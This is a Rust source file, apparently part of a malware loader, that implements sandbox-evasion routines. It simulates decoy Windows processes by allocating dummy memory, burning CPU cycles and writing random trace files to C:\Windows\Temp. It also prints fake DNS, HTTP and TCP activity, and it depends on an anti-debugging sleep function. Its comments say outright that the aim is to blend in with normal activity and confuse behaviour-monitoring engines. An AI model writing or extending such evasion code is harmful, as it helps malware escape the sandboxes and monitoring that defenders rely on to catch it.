// loader/src/evasion/fake_processes.rs

use rand::Rng;

use crate::evasion::anti_debug::encrypted_sleep;

/// Spawns fake processes and simulates their behavior to create environmental noise.
///
/// This routine mimics legitimate system activity by faking memory usage, 
/// delays, and writing plausible trace files. It can be used to blend in with 
/// normal system operations and confuse sandbox heuristics or behavior monitoring engines.    
pub fn spawn_decoy_processes_evasive() {
    use rand::Rng;
    
    let mut rng = rand::thread_rng();
    let count = rng.gen_range(2..=5);
    
    for _ in 0..count {
        // Sample of common, benign Windows processes with fake activities
        let processes = [
            ("cmd", "Windows Update Check"),
            ("powershell", "Get-Date"),
            ("wmic", "os get caption"),
            ("tasklist", ""),
            ("ipconfig", "/all"),
        ];
        
        let (proc, desc) = processes[rng.gen_range(0..processes.len())];
        
        // Simulate the launch and behavior of the chosen process
        simulate_process_activity(proc, desc);
        
        // Random short delay between each decoy (adds realism)
        encrypted_sleep(rng.gen_range(50..300));
    }
}


/// Simulates the internal behavior of a decoy process.
///
/// This function doesn't launch real processes; instead, it mimics process behavior:
/// - Allocates dummy memory
/// - Performs useless computations (to generate CPU noise)
/// - Creates a temporary trace file on disk
fn simulate_process_activity(proc_name: &str, description: &str) {
    // 1. Fake memory footprint — fills buffer with pseudo-random data
    let mut memory_footprint = vec![0u8; 1024];
    for (i, byte) in memory_footprint.iter_mut().enumerate() {
        *byte = (i % 256) as u8;
    }
    
    // 2. Simulate CPU activity — burn cycles with meaningless math
    for _ in 0..10 {
        let mut dummy: u64 = 0;
        for j in 0..100 {
            dummy = dummy.wrapping_add(j as u64);
            dummy = dummy.rotate_left((j % 64) as u32);
        }
        
        // Small delay between "instructions" to simulate runtime
        crate::evasion::anti_debug::encrypted_sleep(5);
    }
    
    // 3. Create a fake trace file to simulate process output/log
    let trace_content = format!(
        "[{}] {} - PID: {}, Time: {}",
        chrono::Local::now().format("%H:%M:%S"),
        description,
        rand::thread_rng().gen_range(1000..20000),
        rand::thread_rng().gen_range(1..100)
    );
    
    // Write trace to a temporary file in a legitimate-looking path
    let _ = std::fs::write(
        format!("C:\\Windows\\Temp\\trace_{}.tmp", 
            rand::thread_rng().gen::<u32>()
        ),
        trace_content
    );
}
    
    
/// Simulates legitimate network activity to further blend into normal system behavior.
///
/// Instead of performing actual network operations, this function uses timing and logging
/// to emulate DNS resolutions, HTTP requests, and TCP activity.
pub fn simulate_network_activity() {
    
    for domain in &["microsoft.com", "google.com", "github.com"] {
        println!("  - Résolution DNS: {}", domain);
        encrypted_sleep(50);
    }
    
    println!("  - Requête HTTP GET /");
    encrypted_sleep(100);
    
    println!("  - Échange de paquets TCP");
    encrypted_sleep(150);
}